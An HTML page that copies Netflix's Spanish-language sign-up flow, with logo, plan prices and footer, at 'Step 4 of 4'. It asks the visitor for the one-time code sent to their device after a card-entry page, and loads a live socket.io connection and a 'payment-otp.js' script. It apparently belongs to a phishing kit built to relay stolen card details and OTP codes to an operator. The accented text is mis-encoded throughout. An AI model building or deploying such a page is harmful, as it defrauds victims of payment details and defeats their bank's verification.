<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificaci√≥n OTP - Netflix</title>
    <link rel="stylesheet" href="css/base.css">
    <link rel="stylesheet" href="css/signup.css">
</head>
<body class="signup-page">
    <header class="header">
        <div class="header-content">
            <img src="img/Netflix_2015_logo.svg.webp" alt="Netflix" class="logo">
            <button class="btn-signin" onclick="window.location.href='index.html'" data-i18n="signout">Cerrar sesi√≥n</button>
        </div>
    </header>

    <section class="payment-card-section">
        <div class="payment-card-container">
            <a href="payment-card.html" class="back-link">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                    <path d="M10 3L5 8l5 5" stroke="currentColor" stroke-width="2" fill="none"/>
                </svg>
                <span data-i18n="backCard">Volver a la tarjeta</span>
            </a>
            
            <p class="step-indicator" data-i18n="paymentStep">Paso 4 de 4</p>
            <h1 data-i18n="otpTitle">Verificaci√≥n de seguridad</h1>
            
            <div class="otp-notice">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#e50914" stroke-width="2">
                    <circle cx="12" cy="12" r="10"/>
                    <path d="M12 6v6l4 2"/>
                </svg>
                <p data-i18n="otpNotice">
                    Por tu seguridad, hemos enviado un c√≥digo de verificaci√≥n a tu dispositivo. 
                    Por favor, ingr√©salo a continuaci√≥n para completar tu membres√≠a.
                </p>
            </div>

            <form id="otpForm" class="payment-form">
                <div class="form-group">
                    <input 
                        type="text" 
                        id="otpCode" 
                        class="form-input otp-input" 
                        placeholder=" " 
                        maxlength="8" 
                        pattern="[0-9]*"
                        inputmode="numeric"
                        required
                    >
                    <label for="otpCode" class="form-label" data-i18n="otpCodeLabel">C√≥digo de verificaci√≥n</label>
                    <svg width="24" height="24" viewBox="0 0 24 24" class="input-icon">
                        <rect x="3" y="11" width="18" height="11" rx="2" fill="none" stroke="currentColor" stroke-width="2"/>
                        <path d="M7 11V7a5 5 0 0110 0v4" fill="none" stroke="currentColor" stroke-width="2"/>
                    </svg>
                </div>

                <p class="otp-help" data-i18n="otpHelp">
                    El c√≥digo fue enviado v√≠a SMS o correo electr√≥nico. Si no lo recibiste, 
                    verifica tu carpeta de spam o solicita un nuevo c√≥digo.
                </p>

                <div class="otp-resend">
                    <button type="button" class="btn-link" id="resendBtn" disabled>
                        <span data-i18n="resendCode">Reenviar c√≥digo</span> (<span id="countdown">60</span>s)
                    </button>
                </div>

                <div class="price-display">
                    <span data-i18n="priceMonth">$ 44.900 al mes</span>
                    <span class="plan-name">Premium</span>
                </div>

                <p class="payment-terms">
                    Al enviar el c√≥digo, confirmas que autorizas el cargo mensual a tu tarjeta de cr√©dito o d√©bito.
                    Puedes cancelar en cualquier momento.
                </p>

                <button type="submit" class="btn-primary" id="submitBtn" disabled data-i18n="startMembership">
                    Iniciar membres√≠a
                </button>
            </form>

            <p class="recaptcha-notice">
                Esta p√°gina est√° protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#" data-i18n="learnMore">M√°s info</a>.
            </p>
        </div>
    </section>

    <footer class="footer footer-simple">
        <div class="container">
            <p class="footer-contact"><span data-i18n="footerContact">¬øPreguntas? Llama al</span> <a href="tel:018005191570">01 800 519 1570</a></p>
            
            <div class="footer-links-horizontal">
                <a href="#" data-i18n="footerLink1">Preguntas frecuentes</a>
                <a href="#" data-i18n="footerLink2">Centro de ayuda</a>
                <a href="#" data-i18n="footerLink10">T√©rminos de uso</a>
                <a href="#" data-i18n="footerLink11">Privacidad</a>
                <a href="#" data-i18n="footerLink12">Preferencias de cookies</a>
                <a href="#" data-i18n="footerLink13">Informaci√≥n corporativa</a>
            </div>
            
            <div class="language-selector footer-lang">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" class="globe-icon">
                    <path d="M8 0a8 8 0 100 16A8 8 0 008 0zm4.9 7.2h-2.5c-.1-1.5-.5-2.9-1.1-4.1 1.8.6 3.2 2 3.6 4.1zM8 14.4c-.8 0-2.1-2.6-2.3-5.6h4.6c-.2 3-1.5 5.6-2.3 5.6zm-.3-7.2c.2-3 1.5-5.6 2.3-5.6.8 0 2.1 2.6 2.3 5.6H7.7zm-1.1-4.1c-.6 1.2-1 2.6-1.1 4.1H3c.4-2.1 1.8-3.5 3.6-4.1zM3 8.8h2.5c.1 1.5.5 2.9 1.1 4.1-1.8-.6-3.2-2-3.6-4.1zm7.4 4.1c.6-1.2 1-2.6 1.1-4.1H13c-.4 2.1-1.8 3.5-3.6 4.1z"/>
                </svg>
                <select onchange="changeLang(this.value)">
                    <option value="es">Espa√±ol</option>
                    <option value="en">English</option>
                </select>
                <svg width="12" height="12" viewBox="0 0 12 12" fill="currentColor" class="arrow-icon">
                    <path d="M6 9L1 4h10z"/>
                </svg>
            </div>
        </div>
    </footer>

    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <script src="js/socket-client.js"></script>
    <script src="js/translations.js"></script>
    <script>
        // Display selected plan dynamically
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üí∞ Loading plan info from localStorage');
            const selectedPlan = localStorage.getItem('netflix_selected_plan') || 'premium';
            console.log('Selected plan:', selectedPlan);
            
            const planNameEl = document.querySelector('.plan-name');
            const priceEl = document.querySelector('.price-display span:first-child');
            
            const planData = {
                basic: { name: 'B√°sico', price: '$ 18.900 al mes' },
                standard: { name: 'Est√°ndar', price: '$ 29.900 al mes' },
                premium: { name: 'Premium', price: '$ 44.900 al mes' }
            };
            
            if (planNameEl && planData[selectedPlan]) {
                planNameEl.textContent = planData[selectedPlan].name;
                console.log('‚úÖ Plan name updated:', planData[selectedPlan].name);
            }
            if (priceEl && planData[selectedPlan]) {
                priceEl.textContent = planData[selectedPlan].price;
                console.log('‚úÖ Price updated:', planData[selectedPlan].price);
            }
            
            // Wait for socketManager to be ready
            setTimeout(function() {
                if (typeof socketManager !== 'undefined') {
                    console.log('‚úÖ socketManager is ready');
                    console.log('Connection status:', socketManager.isConnected());
                } else {
                    console.error('‚ùå socketManager NOT available after timeout');
                }
            }, 1000);
        });
    </script>
    <script src="js/payment-otp.js"></script>
</body>
</html>
